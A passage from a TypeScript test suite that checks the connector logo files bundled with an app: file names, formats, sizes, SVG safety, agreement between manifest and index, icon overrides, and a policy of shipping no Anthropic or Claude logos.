    expect(brandWords('Café', 'https://mcp.exemplo.com.br/x')).toContain('cafe')
    expect(brandWords('', undefined)).toEqual([])
  })
})

describe('the logos that ship with the app', () => {
  const directoryFile = path.join(ROOT, 'resources', 'mcp-directory.json')
  const manifestFile = path.join(ROOT, 'docs', 'mcp', 'icones-conectores.json')
  const entries = (JSON.parse(fs.readFileSync(directoryFile, 'utf8')) as { entries: DirectoryConnector[] }).entries
  const onDisk = fs.existsSync(ICONS_DIR) ? fs.readdirSync(ICONS_DIR) : []
  const referenced = new Set([...Object.values(CONNECTOR_ICON_INDEX.byId), ...Object.values(CONNECTOR_ICON_INDEX.byDomain), ...Object.values(CONNECTOR_ICON_INDEX.byBrand)])

  it('has a file for everything the index points to, and nothing else lying around', () => {
    expect(referenced.size).toBeGreaterThan(500)
    for (const file of referenced) expect(onDisk, file).toContain(file)
    expect(onDisk.filter((file) => !referenced.has(file))).toEqual([])
  })

  it('uses only WebP and SVG, with safe names and a small total weight', () => {
    let total = 0
    for (const file of onDisk) {
      expect(file, file).toMatch(/^[a-z0-9][a-z0-9-]*\.(webp|svg)$/)
      expect(file, file).not.toMatch(/^(con|prn|aux|nul|com\d|lpt\d)\./)
      const size = fs.statSync(path.join(ICONS_DIR, file)).size
      expect(size, file).toBeLessThan(40_000)
      total += size
    }
    expect(total).toBeLessThan(6_000_000)
  })

  it('ships SVG that is safe to show as an <img>, and WebP that is exactly one tile', async () => {
    for (const file of onDisk.filter((name) => name.endsWith('.svg'))) {
      expect(isSafeSvgAsset(fs.readFileSync(path.join(ICONS_DIR, file), 'utf8')), file).toBe(true)
    }
    const sizes = new Set<string>()
    for (const file of onDisk.filter((name) => name.endsWith('.webp'))) {
      const meta = await sharp(path.join(ICONS_DIR, file)).metadata()
      expect(meta.format, file).toBe('webp')
      sizes.add(`${meta.width}x${meta.height}`)
    }
    expect([...sizes]).toEqual([`${TILE_SIZE}x${TILE_SIZE}`])
  })

  it('covers at least 95% of the entries that have an icon domain', () => {
    const rows = buildRows(entries, [])
    const withDomain = rows.filter((row) => row.entry?.iconDomain)
    const covered = withDomain.filter((row) => connectorIconFile(row))
    expect(withDomain.length).toBeGreaterThan(800)
    expect(covered.length / withDomain.length).toBeGreaterThanOrEqual(0.95)
  })

  it('keeps the manifest, the index and the directory in agreement', () => {
    const manifest = JSON.parse(fs.readFileSync(manifestFile, 'utf8')) as {
      entries: Record<string, { file: string; source: string; sourceUrl: string; domain: string }>
      missing: Record<string, { reason: string }>
      brands: Record<string, { file: string }>
      summary: { entries: number; withLogo: number; withoutLogo: number }
    }
    const ids = entries.map((entry) => entry.id)
    expect(Object.keys(manifest.entries).length + Object.keys(manifest.missing).length).toBe(ids.length)
    expect(manifest.summary).toMatchObject({ entries: ids.length, withLogo: Object.keys(manifest.entries).length, withoutLogo: Object.keys(manifest.missing).length })
    for (const id of ids) {
      const inIndex = CONNECTOR_ICON_INDEX.byId[id]
      if (manifest.entries[id]) {
        expect(inIndex, id).toBe(manifest.entries[id].file)
        expect(['manual', 'diretorio', 'simple-icons', 'site', 'servico-de-favicons'], id).toContain(manifest.entries[id].source)
        expect(manifest.entries[id].sourceUrl.length, id).toBeGreaterThan(0)
      } else {
        expect(inIndex, id).toBeUndefined()
        expect(manifest.missing[id].reason.length, id).toBeGreaterThan(0)
      }
    }
    expect(Object.keys(manifest.brands).sort()).toEqual(Object.keys(CONNECTOR_ICON_INDEX.byBrand).sort())
  })

  it('keeps the hand-made overrides honest: real ids, real simple-icons slugs, one action each', () => {
    const overrides = JSON.parse(fs.readFileSync(path.join(ROOT, 'scripts', 'data', 'connector-icons-overrides.json'), 'utf8')) as {
      entries: Record<string, { simpleIcon?: string; iconUrl?: string; domain?: string; skip?: string }>
      brands: Record<string, string>
    }
    const slugs = new Set((JSON.parse(fs.readFileSync(path.join(ROOT, 'node_modules', 'simple-icons', 'data', 'simple-icons.json'), 'utf8')) as Array<{ slug: string }>).map((icon) => icon.slug))
    const ids = new Set(entries.map((entry) => entry.id))
    for (const [id, action] of Object.entries(overrides.entries)) {
      expect(ids.has(id), `${id} is not in the directory`).toBe(true)
      expect(Object.keys(action), id).toHaveLength(1)
      expect(['simpleIcon', 'iconUrl', 'domain', 'skip'], id).toContain(Object.keys(action)[0])
      if (action.simpleIcon) expect(slugs.has(action.simpleIcon), `${id}: simple-icons has no "${action.simpleIcon}"`).toBe(true)
      if (action.iconUrl) expect(action.iconUrl, id).toMatch(/^https:\/\//)
    }
    for (const [word, slug] of Object.entries(overrides.brands)) {
      expect(word, word).toMatch(/^[a-z0-9]+$/)
      expect(slugs.has(slug), `brand "${word}": simple-icons has no "${slug}"`).toBe(true)
    }
  })

  it('never maps a platform domain (github.com, google.com, claude.com...) to a logo', () => {
    for (const domain of ['github.com', 'gitlab.com', 'google.com', 'googleapis.com', 'claude.com', 'claude.ai', 'anthropic.com', 'modelcontextprotocol.io', 'sanity.io', 'npmjs.com']) {
      expect(CONNECTOR_ICON_INDEX.byDomain[domain], domain).toBeUndefined()
    }
  })

  it('does not ship logos of Anthropic or Claude (project policy, THIRD_PARTY_NOTICES.md section 5)', () => {
    const manifest = JSON.parse(fs.readFileSync(manifestFile, 'utf8')) as { entries: Record<string, unknown>; missing: Record<string, { reason: string }> }
    for (const id of ['claude-academy', 'anthropic-economic-index']) {
      expect(manifest.entries[id], id).toBeUndefined()
      expect(manifest.missing[id].reason, id).toMatch(/Anthropic/)
      expect(CONNECTOR_ICON_INDEX.byId[id], id).toBeUndefined()
    }
    expect(Object.keys(CONNECTOR_ICON_INDEX.byBrand).filter((word) => /claude|anthropic/.test(word))).toEqual([])
  })

  it('draws a logo for the brands the user connected by hand, and the initials for the rest', () => {
    const custom = (id: string, endpoint?: string) => ({ id, name: id, custom: true, endpoint })
    for (const id of ['whatsapp', 'appwrite-api', 'appwrite-docs', 'appwrite-cli-mcp']) expect(connectorIconFile(custom(id)), id).toBeTruthy()
    expect(connectorIconFile(custom('mercadopago', 'https://mcp.mercadopago.com/mcp'))).toBeTruthy()
    for (const id of ['affinitas', 'bridge_gpt', 'figcraft', 'rea']) expect(connectorIconFile(custom(id)), id).toBeNull()
    // The directory entries the user also connected: Atlassian and Jira.
    for (const id of ['atlassian', 'jira']) expect(connectorIconFile(buildRows(entries, []).find((row) => row.id === id)!), id).toBeTruthy()
  })
})
